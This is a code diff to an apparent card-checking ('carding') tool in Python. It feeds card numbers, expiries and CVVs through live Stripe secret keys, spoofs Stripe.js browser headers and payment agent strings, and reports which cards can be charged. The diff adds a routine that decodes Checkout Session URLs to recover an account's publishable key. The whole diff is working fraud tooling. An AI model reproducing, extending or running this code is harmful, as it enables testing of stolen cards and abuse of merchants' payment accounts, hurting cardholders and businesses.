@@ -7,10 +7,12 @@ import random
 import uuid
 import sys
 import httpx
+import base64
+import stripe
 
 def derive_pk_or_acct(sk_key, pk_key=None):
+    acct_id = None
     if pk_key and pk_key.startswith('pk_live_'):
-        acct_id = None
         if '_' in pk_key:
             raw = pk_key.split('_')[-1]
             if raw.startswith('51'):
@@ -31,12 +33,51 @@ def derive_pk_or_acct(sk_key, pk_key=None):
     derived_pk = pk_key or ('pk_live_' + raw_sk)
     return derived_pk, acct_id
 
+def extract_real_pk_from_sk(sk_key):
+    try:
+        session = stripe.checkout.Session.create(
+            api_key=sk_key,
+            payment_method_types=['card'],
+            line_items=[{'price_data': {'currency': 'usd', 'product_data': {'name': 'Audit'}, 'unit_amount': 100}, 'quantity': 1}],
+            mode='payment',
+            success_url='https://example.com/success',
+            cancel_url='https://example.com/cancel',
+        )
+        checkout_url = session.url
+        if '#' in checkout_url:
+            url_part = checkout_url.split('#')[1]
+            encoded_url = url_part.replace('%2B', '+').replace('%2F', '/')
+            encoded_url += '=' * (len(encoded_url) % 4)
+            decoded_bytes = base64.urlsafe_b64decode(encoded_url)
+            decoded_url = decoded_bytes.decode('utf-8')
+            key = 5
+            binary_key = bin(key)[2:].zfill(8)
+            plaintext = ''
+            for i in range(len(decoded_url)):
+                binary_char = bin(ord(decoded_url[i]))[2:].zfill(8)
+                xor_result = ''
+                for j in range(8):
+                    xor_result += str(int(binary_char[j]) ^ int(binary_key[j]))
+                plaintext += chr(int(xor_result, 2))
+            if 'pk_live_' in plaintext:
+                raw_pk = plaintext.split('pk_live_')[1].split('"')[0]
+                return 'pk_live_' + raw_pk
+    except Exception as e:
+        print(f"extract_real_pk_from_sk error: {e}")
+    return None
+
 async def validate_stripe_sk(sk_key, pk_key=None):
     sk_key = sk_key.strip()
     if not sk_key.startswith('sk_live_'):
         return False, 'Invalid Key Format', None
 
-    derived_pk, acct_id = derive_pk_or_acct(sk_key, pk_key)
+    real_pk = None
+    if pk_key and pk_key.startswith('pk_live_') and pk_key.replace('pk_live_', '') != sk_key.replace('sk_live_', ''):
+        real_pk = pk_key
+    else:
+        real_pk = extract_real_pk_from_sk(sk_key)
+
+    derived_pk, acct_id = derive_pk_or_acct(sk_key, real_pk)
     headers = {'Authorization': 'Bearer ' + sk_key, 'User-Agent': 'Mozilla/5.0'}
 
     try:
@@ -82,133 +123,59 @@ async def validate_stripe_sk(sk_key, pk_key=None):
         return False, 'Error checking key: ' + str(e), None
 
 async def skintoff_engine(session, cc, mm, yy, cvv, sk_key, pk_key):
-    max_amt = 0
-    max_retry = 3
-    derived_pk, acct_id = derive_pk_or_acct(sk_key, pk_key)
+    if not pk_key or not pk_key.startswith('pk_live_') or pk_key.replace('pk_live_', '') == sk_key.replace('sk_key_', '').replace('sk_live_', ''):
+        extracted = extract_real_pk_from_sk(sk_key)
+        if extracted:
+            pk_key = extracted
 
-    url = 'https://api.stripe.com/v1/payment_methods'
-    headers = {
+    dummy_pk, sk_acct_id = derive_pk_or_acct(sk_key, None)
+
+    # Step 1: Create PaymentIntent with SK
+    headers_pi = {'Authorization': f'Bearer {sk_key}'}
+    data_pi = {'amount': 100, 'currency': 'usd'}
+    
+    try:
+        r1 = await session.post('https://api.stripe.com/v1/payment_intents', headers=headers_pi, data=data_pi)
+        pi_json = r1.json()
+        client_secret = pi_json.get('client_secret')
+        pi_id = pi_json.get('id')
+    except Exception as e:
+        return f'[Step 1 Error] {str(e)}'
+
+    if not client_secret or not pi_id:
+        err_msg = pi_json.get('error', {}).get('message', 'Failed to create PaymentIntent')
+        return f'[Step 1 Error] {err_msg}'
+
+    # Step 2: Confirm PaymentIntent via real PK + payment_user_agent
+    headers_confirm = {
         'authority': 'api.stripe.com',
         'accept': 'application/json',
-        'accept-language': 'en-US',
         'content-type': 'application/x-www-form-urlencoded',
         'origin': 'https://js.stripe.com',
         'referer': 'https://js.stripe.com/',
-        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
     }
 
-    if acct_id:
-        headers['Stripe-Account'] = acct_id
-
-    data = {
-        'type': 'card',
-        'key': derived_pk,
-        'card[number]': cc,
-        'card[cvc]': cvv,
-        'card[exp_month]': mm,
-        'card[exp_year]': yy,
-        'billing_details[name]': 'Ayan XD',
-        'billing_details[address][city]': 'Los Angeles',
-        'billing_details[address][country]': 'US',
-        'billing_details[address][line1]': '1234 Street',
-        'billing_details[address][postal_code]': '90001',
-        'billing_details[address][state]': 'CA',
-        'guid': str(uuid.uuid4()),
-        'muid': str(uuid.uuid4()),
-        'sid': str(uuid.uuid4()),
-        'payment_user_agent': 'stripe.js/split-card-element',
-        'time_on_page': random.randint(10021, 10090),
-    }
-
-    if acct_id:
-        data['_stripe_account'] = acct_id
-
-    attempts = 0
-    while True:
-        if attempts >= max_retry:
-            return 'Max retry reached due to connection issues (payment_methods)'
-
-        try:
-            result = await session.post(url=url, headers=headers, data=data)
-        except Exception:
-            attempts += 1
-            continue
-
-        text = result.text
-        if 'Invalid API Key provided' in text:
-            return 'Invalid API Key'
-        if 'api_key_expired' in text:
-            return 'API Key Expired'
-        if 'Your account cannot currently make live charges.' in text:
-            return 'Account Cannot Make Live Charges'
-
-        if 'Request rate limit exceeded.' in text:
-            max_amt += 1
-            if max_amt == max_retry:
-                return '429 Too Many Requests'
-            continue
-        else:
-            break
-
-    try:
-        response_json = result.json()
-        payment_method_id = response_json.get('id')
-        if not payment_method_id:
-            err_msg = response_json.get('error', {}).get('message', 'Unexpected response')
-            return f'[Step 1 Error] {err_msg}'
-    except Exception:
-        return 'Unexpected response (no ID)'
-
-    url = 'https://api.stripe.com/v1/payment_intents'
-    headers = {
-        'authority': 'api.stripe.com',
-        'accept': 'application/json',
-        'accept-language': 'en-US',
-        'content-type': 'application/x-www-form-urlencoded',
-        'Authorization': f'Bearer {sk_key}',
-        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
-    }
-
-    data = {
-        'amount': 100,
-        'currency': 'usd',
-        'payment_method_types[]': 'card',
-        'payment_method': payment_method_id,
-        'confirm': 'true',
-        'off_session': 'true',
+    data_confirm = {
+        'key': pk_key,
+        'client_secret': client_secret,
+        'payment_method_data[type]': 'card',
+        'payment_method_data[card][number]': cc,
+        'payment_method_data[card][cvc]': cvv,
+        'payment_method_data[card][exp_month]': mm,
+        'payment_method_data[card][exp_year]': yy,
+        'payment_method_data[payment_user_agent]': 'stripe.js/064d3d4e55; stripe-js-v3/064d3d4e55; split-card-element',
+        'expected_payment_method_type': 'card',
         'use_stripe_sdk': 'true',
-        'description': 'None',
-        'receipt_email': 'xhfuhuduburyg@gmail.com',
-        'metadata[order_id]': str(random.randint(100000000000000000, 999999999999999999)),
     }
-
-    attempts = 0
-    while True:
-        if attempts >= max_retry:
-            return 'Max retry reached due to connection issues (payment_intents)'
-
-        try:
-            response = await session.post(url=url, headers=headers, data=data)
-        except Exception:
-            attempts += 1
-            continue
-
-        text = response.text
-        if 'Invalid API Key provided' in text:
-            return 'Invalid API Key'
-        if 'api_key_expired' in text:
-            return 'API Key Expired'
-
-        if 'Request rate limit exceeded.' in text:
-            max_amt += 1
-            if max_amt == max_retry:
-                return '429 Too Many Requests'
-            continue
-        else:
-            break
+    if sk_acct_id:
+        data_confirm['_stripe_account'] = sk_acct_id
 
     try:
-        json_res = response.json()
+        r2 = await session.post(f'https://api.stripe.com/v1/payment_intents/{pi_id}/confirm', headers=headers_confirm, data=data_confirm)
+        text = r2.text
+        json_res = r2.json()
+
         if 'requires_action' in text or 'requires_source_action' in text:
             return '3D Secure Required'
         if '"cvc_check": "pass"' in text or '"cvc_check":"pass"' in text:
@@ -222,8 +189,8 @@ async def skintoff_engine(session, cc, mm, yy, cvv, sk_key, pk_key):
             return 'Charged $1'
         else:
             return 'Unexpected response'
-    except Exception:
-        return 'Unexpected response'
+    except Exception as e:
+        return f'[Step 2 Error] {str(e)}'
 
 async def check_card_sk(cc, mm, yy, cvc, sk_key=None, pk_key=None, proxy_url=None, user_id=None):
     if not sk_key or not pk_key:
@@ -252,7 +219,7 @@ async def check_card_sk(cc, mm, yy, cvc, sk_key=None, pk_key=None, proxy_url=Non
                     res_str = await skintoff_engine(session, cc, mm, yy, cvc, sk_key=sk_key, pk_key=derived_pk)
             else:
                 raise pe
-            
+
         res_lower = str(res_str).lower()
         if 'charged' in res_lower or 'succeeded' in res_lower:
             return True, 'Charged! 🟢', res_str, res_str
